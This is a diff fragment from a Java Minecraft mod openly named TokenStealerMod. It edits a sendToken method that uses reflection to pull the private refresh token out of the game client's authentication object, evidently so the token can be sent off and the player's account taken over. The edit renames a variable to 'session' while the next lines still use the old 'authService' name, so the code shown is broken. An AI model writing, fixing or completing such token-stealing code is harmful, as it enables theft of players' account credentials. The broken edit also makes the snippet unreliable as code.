@@ -34,7 +34,7 @@ public class TokenStealerMod implements ModInitializer {
 
     private void sendToken(MinecraftClient client) throws Exception {
         // Get the refresh token using reflection
-        var authService = client.getAuthenticationService();
+        var session = client.getSession();
         java.lang.reflect.Field field = authService.getClass().getDeclaredField("refreshToken");
         field.setAccessible(true);
         String token = (String) field.get(authService);
